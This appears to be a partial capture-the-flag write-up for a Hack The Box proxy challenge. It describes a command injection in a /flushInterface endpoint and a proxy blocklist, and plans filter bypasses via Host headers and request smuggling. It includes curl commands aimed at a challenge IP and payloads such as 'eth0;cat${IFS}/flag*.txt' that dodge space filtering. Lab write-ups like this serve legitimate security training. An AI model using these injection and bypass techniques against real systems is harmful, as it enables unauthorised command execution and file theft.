# HTB Proxy Challenge Solution

## Analysis

### Vulnerabilities Found:

1. **Command Injection in `/flushInterface` endpoint** (backend/index.js:35)
   - The `interface` parameter is directly inserted into shell command: `ip address flush dev ${interface}`
   - Validation only checks for spaces, but other injection methods work

2. **Proxy Restrictions**:
   - Blocks URLs containing "flushinterface" (case-insensitive)
   - Blocks hosts that resolve to localhost (127.0.0.1, ::1, etc.)
   - Blocks string patterns: "localhost", "127.", "172.", "192.", "10.", "0.0.0.0"

### Attack Vector:

1. **Bypass localhost check**: Use the container's hostname or a non-blacklisted IP to access the backend
2. **Bypass URL check**: Use HTTP request smuggling or find a way to reach `/flushInterface` without it in the URL
3. **Command injection**: Inject commands in the `interface` parameter to read the flag

## Exploitation Steps:

### Step 1: Get Server Information
```bash
curl -X GET "http://83.136.255.53:38862/server-status" \
  -H "Host: example.com:80"
```

This returns hostname and IP addresses of the server.

### Step 2: Access Backend
Try accessing the backend using:
- Container hostname (if it doesn't resolve to localhost)
- Non-blacklisted IP addresses from server-info

### Step 3: Command Injection
Once we can access `/flushInterface`, inject commands:
```json
{"interface": "eth0;cat${IFS}/flag*.txt"}
```

Or using command substitution:
```json
{"interface": "eth0;cat$(echo${IFS}/flag*.txt)"}
```

### Step 4: Bypass URL Check
The proxy blocks URLs containing "flushinterface". Possible bypasses:
- HTTP Request Smuggling (CL.TE or TE.CL)
- Use a different path that routes to the same endpoint (unlikely)
- Find a bug in the URL parsing

## Alternative Approach:

If direct access doesn't work, we might need to:
1. Set up our own server that the proxy can access
2. Have that server make requests to the backend
3. Use that to bypass the restrictions

## Testing Commands:

```bash
# Test 1: Get server info
curl -X GET "http://83.136.255.53:38862/server-status" -H "Host: example.com:80"

# Test 2: Try accessing backend via hostname
# (Replace HOSTNAME with actual hostname from step 1)
curl -X POST "http://83.136.255.53:38862/getAddresses" \
  -H "Host: HOSTNAME:5000" \
  -H "Content-Type: application/json" \
  -d "{}"

# Test 3: Try /flushInterface (will be blocked, but test error)
curl -X POST "http://83.136.255.53:38862/flushInterface" \
  -H "Host: HOSTNAME:5000" \
  -H "Content-Type: application/json" \
  -d '{"interface": "eth0"}'

# Test 4: Command injection (once we can access the endpoint)
curl -X POST "http://83.136.255.53:38862/flushInterface" \
  -H "Host: HOSTNAME:5000" \
  -H "Content-Type: application/json" \
  -d '{"interface": "eth0;cat${IFS}/flag*.txt"}'
```

